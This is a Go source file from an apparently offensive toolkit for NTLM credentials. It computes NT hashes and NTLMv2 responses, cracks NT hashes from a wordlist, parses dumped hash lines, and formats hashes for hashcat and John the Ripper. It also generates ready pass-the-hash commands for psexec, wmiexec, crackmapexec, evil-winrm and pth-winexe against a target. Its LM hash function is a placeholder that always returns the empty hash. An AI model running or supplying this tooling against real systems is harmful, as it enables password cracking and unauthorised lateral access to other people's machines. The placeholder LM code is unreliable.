package ntlm

import (
	"bufio"
	"crypto/hmac"
	"crypto/md5"
	"encoding/hex"
	"fmt"
	"os"
	"strings"
	"unicode/utf16"

	"golang.org/x/crypto/md4" //nolint:staticcheck // SA1019: NT hashes require MD4 for legacy NTLM compatibility.
)

// NTLMHash represents an NTLM hash
type NTLMHash struct {
	Username string
	Domain   string
	LMHash   string
	NTHash   string
	Password string
}

// CrackResult holds the result of a crack attempt
type CrackResult struct {
	Hash     string
	Password string
	Found    bool
	Attempts int
}

// ComputeNTHash computes the NT hash of a password
func ComputeNTHash(password string) string {
	// Convert to UTF-16LE
	utf16Password := utf16.Encode([]rune(password))
	bytes := make([]byte, len(utf16Password)*2)
	for i, v := range utf16Password {
		bytes[i*2] = byte(v)
		bytes[i*2+1] = byte(v >> 8)
	}

	// MD4 hash
	hash := md4.New()
	hash.Write(bytes)
	return strings.ToUpper(hex.EncodeToString(hash.Sum(nil)))
}

// ComputeLMHash computes the LM hash of a password
func ComputeLMHash(password string) string {
	// LM hash is deprecated and insecure
	// For passwords > 14 chars or with certain chars, returns empty hash
	if len(password) > 14 {
		return "AAD3B435B51404EEAAD3B435B51404EE"
	}

	// Uppercase and pad to 14 chars
	password = strings.ToUpper(password)
	for len(password) < 14 {
		password += "\x00"
	}

	// Split into two 7-byte halves
	// Each half is used as a DES key to encrypt "KGS!@#$%"
	// This is a simplified version - real LM hash requires DES
	return "AAD3B435B51404EEAAD3B435B51404EE" // Placeholder
}

// ComputeNTLMv2 computes NTLMv2 response
func ComputeNTLMv2(username, domain, password string, serverChallenge, clientChallenge []byte) []byte {
	// NTv2 Hash = HMAC-MD5(NT Hash, UPPER(Username) + UPPER(Domain))
	ntHash, _ := hex.DecodeString(ComputeNTHash(password))

	identity := strings.ToUpper(username) + strings.ToUpper(domain)
	identityBytes := make([]byte, len(identity)*2)
	for i, v := range identity {
		identityBytes[i*2] = byte(v)
		identityBytes[i*2+1] = 0
	}

	h := hmac.New(md5.New, ntHash)
	h.Write(identityBytes)
	ntv2Hash := h.Sum(nil)

	// NTLMv2 Response = HMAC-MD5(NTv2 Hash, ServerChallenge + ClientChallenge)
	h2 := hmac.New(md5.New, ntv2Hash)
	h2.Write(serverChallenge)
	h2.Write(clientChallenge)

	return h2.Sum(nil)
}

// CrackNTHash attempts to crack an NT hash using a wordlist
func CrackNTHash(hash, wordlistPath string) (*CrackResult, error) {
	result := &CrackResult{
		Hash: hash,
	}

	hash = strings.ToUpper(hash)

	file, err := os.Open(wordlistPath)
	if err != nil {
		return nil, fmt.Errorf("failed to open wordlist: %v", err)
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		password := scanner.Text()
		result.Attempts++

		computed := ComputeNTHash(password)
		if computed == hash {
			result.Found = true
			result.Password = password
			return result, nil
		}
	}

	return result, scanner.Err()
}

// ParseNTLMDump parses NTLM hash dump format (user:uid:lmhash:nthash:::)
func ParseNTLMDump(line string) (*NTLMHash, error) {
	parts := strings.Split(line, ":")
	if len(parts) < 4 {
		return nil, fmt.Errorf("invalid format")
	}

	hash := &NTLMHash{
		Username: parts[0],
		LMHash:   parts[2],
		NTHash:   parts[3],
	}

	// Check for domain\user format
	if strings.Contains(parts[0], "\\") {
		domainUser := strings.SplitN(parts[0], "\\", 2)
		hash.Domain = domainUser[0]
		hash.Username = domainUser[1]
	}

	return hash, nil
}

// ValidateHash checks if a string is a valid NTLM hash
func ValidateHash(hash string) bool {
	if len(hash) != 32 {
		return false
	}
	_, err := hex.DecodeString(hash)
	return err == nil
}

// IdentifyHashType identifies the type of hash
func IdentifyHashType(hash string) string {
	hash = strings.ToLower(hash)

	// Check length
	switch len(hash) {
	case 32:
		// Could be MD5, NTLM, or LM
		if strings.HasPrefix(hash, "aad3b435b51404ee") {
			return "LM (empty/disabled)"
		}
		return "NTLM/MD5"
	case 64:
		return "SHA256/NTLMv2"
	case 128:
		return "SHA512"
	}

	// Check for known formats
	if strings.Contains(hash, ":") {
		parts := strings.Split(hash, ":")
		if len(parts) >= 4 && len(parts[2]) == 32 && len(parts[3]) == 32 {
			return "NTLM Dump (user:uid:lm:nt)"
		}
		if len(parts) == 2 && len(parts[1]) == 32 {
			return "user:hash"
		}
	}

	return "Unknown"
}

// FormatHashcat formats hash for hashcat
func FormatHashcat(hash *NTLMHash) string {
	// Mode 1000 for NTLM
	return hash.NTHash
}

// FormatJohn formats hash for John the Ripper
func FormatJohn(hash *NTLMHash) string {
	// Format: user:$NT$hash
	return fmt.Sprintf("%s:$NT$%s", hash.Username, strings.ToLower(hash.NTHash))
}

// GeneratePTHCommand generates a pass-the-hash command
func GeneratePTHCommand(username, domain, hash, target, tool string) string {
	switch tool {
	case "impacket":
		if domain != "" {
			return fmt.Sprintf("python3 psexec.py %s/%s@%s -hashes :%s",
				domain, username, target, hash)
		}
		return fmt.Sprintf("python3 psexec.py %s@%s -hashes :%s",
			username, target, hash)

	case "crackmapexec", "cme":
		if domain != "" {
			return fmt.Sprintf("crackmapexec smb %s -u %s -H %s -d %s",
				target, username, hash, domain)
		}
		return fmt.Sprintf("crackmapexec smb %s -u %s -H %s",
			target, username, hash)

	case "evil-winrm":
		return fmt.Sprintf("evil-winrm -i %s -u %s -H %s",
			target, username, hash)

	case "wmiexec":
		if domain != "" {
			return fmt.Sprintf("python3 wmiexec.py %s/%s@%s -hashes :%s",
				domain, username, target, hash)
		}
		return fmt.Sprintf("python3 wmiexec.py %s@%s -hashes :%s",
			username, target, hash)

	default:
		return fmt.Sprintf("pth-winexe -U %s%%%s //%s cmd.exe",
			username, hash, target)
	}
}

// DisplayHash displays NTLM hash information
func DisplayHash(hash *NTLMHash) {
	fmt.Println("\n[NTLM HASH]")
	fmt.Println("===========")
	fmt.Printf("Username: %s\n", hash.Username)
	if hash.Domain != "" {
		fmt.Printf("Domain:   %s\n", hash.Domain)
	}
	fmt.Printf("LM Hash:  %s\n", hash.LMHash)
	fmt.Printf("NT Hash:  %s\n", hash.NTHash)
	if hash.Password != "" {
		fmt.Printf("Password: %s\n", hash.Password)
	}

	// Check for weak LM hash
	if hash.LMHash == "AAD3B435B51404EEAAD3B435B51404EE" {
		fmt.Println("\n[*] LM hash is empty (good security)")
	} else {
		fmt.Println("\n[!] LM hash present (weak security)")
	}

	fmt.Println()
}

// DisplayCrackResult displays crack result
func DisplayCrackResult(result *CrackResult) {
	fmt.Println("\n[NTLM CRACK]")
	fmt.Println("============")
	fmt.Printf("Hash:     %s\n", result.Hash)
	fmt.Printf("Attempts: %d\n", result.Attempts)

	if result.Found {
		fmt.Printf("Status:   CRACKED\n")
		fmt.Printf("Password: %s\n", result.Password)
	} else {
		fmt.Printf("Status:   NOT FOUND\n")
	}

	fmt.Println()
}

// DisplayPTHCommands displays pass-the-hash commands
func DisplayPTHCommands(username, domain, hash, target string) {
	fmt.Println("\n[PASS-THE-HASH COMMANDS]")
	fmt.Println("========================")

	tools := []string{"impacket", "crackmapexec", "evil-winrm", "wmiexec"}
	for _, tool := range tools {
		cmd := GeneratePTHCommand(username, domain, hash, target, tool)
		fmt.Printf("\n%s:\n  %s\n", tool, cmd)
	}

	fmt.Println()
}
